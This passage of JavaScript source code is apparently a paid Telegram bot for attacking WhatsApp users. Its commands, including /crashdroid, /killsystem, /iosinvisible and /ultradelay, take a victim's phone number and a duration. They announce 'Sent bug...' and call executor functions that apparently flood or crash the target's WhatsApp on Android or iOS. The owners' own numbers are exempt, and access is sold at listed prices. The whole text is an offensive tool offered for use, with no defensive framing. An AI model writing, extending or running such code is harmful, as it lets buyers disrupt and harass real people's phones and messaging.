  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /newdelay: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /newdelay: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /newdelay: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /newdelay: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      XeonDelay1(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /newdelay for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /newdelay: ${error.message}`);
  }
});

botInstance.onText(/\/xxxssehse(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /visiblemax raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /visiblemax input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /visiblemax: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /visiblemax +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /visiblemax: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /visiblemax +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /visiblemax: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /visiblemax: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /visiblemax: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /visiblemax: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonMxExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /visiblemax for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /visiblemax: ${error.message}`);
  }
});

botInstance.onText(/\/crashdroid(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /crashdroid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /crashdroid input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /crashdroid: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /crashdroid +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /crashdroid: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /crashdroid +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /crashdroid: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /crashdroid: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /crashdroid: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /crashdroid: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      callXeonExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /crashdroid for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /crashdroid: ${error.message}`);
  }
});

botInstance.onText(/\/cssfd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /uiking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /uiking input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /uiking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /uiking +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /uiking: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /uiking +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /uiking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /uiking: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /uiking: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /uiking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUiKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /uiking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /uiking: ${error.message}`);
  }
});

botInstance.onText(/\/killsystem(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /killsystem raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /killsystem input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /killsystem: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /killsystem +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /killsystem: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /killsystem +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /killsystem: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /killsystem: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /killsystem: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /killsystem: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUiKingExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /killsystem for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /killsystem: ${error.message}`);
  }
});

botInstance.onText(/\/brZx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /ultradelay raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /ultradelay input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /ultradelay: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /ultradelay +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /ultradelay: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /ultradelay +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /ultradelay: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /ultradelay: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /ultradelay: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /ultradelay: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonUltraDelayExecutor(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /ultradelay for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /ultradelay: ${error.message}`);
  }
});

botInstance.onText(/\/dssd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delaymix raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /delaymix input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /delaymix: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delaymix +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /delaymix: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delaymix +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delaymix: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /delaymix: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delaymix: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delaymix: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonDelayMix(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /delaymix for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delaymix: ${error.message}`);
  }
});

botInstance.onText(/\/iosinvisible(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /iosinvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /iosinvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /iosinvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /iosinvisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /iosinvisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /iosinvisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /iosinvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /iosinvisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /iosinvisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /iosinvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104413'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
      await XiosInviNew(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /iosinvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /iosinvisible: ${error.message}`);
  }
});

botInstance.onText(/\/iosvisible(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /iosvisible raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /iosvisible input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /iosvisible: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /iosvisible +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /iosvisible: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /iosvisible +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /iosvisible: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /iosvisible: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /iosvisible: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /iosvisible: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104413'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
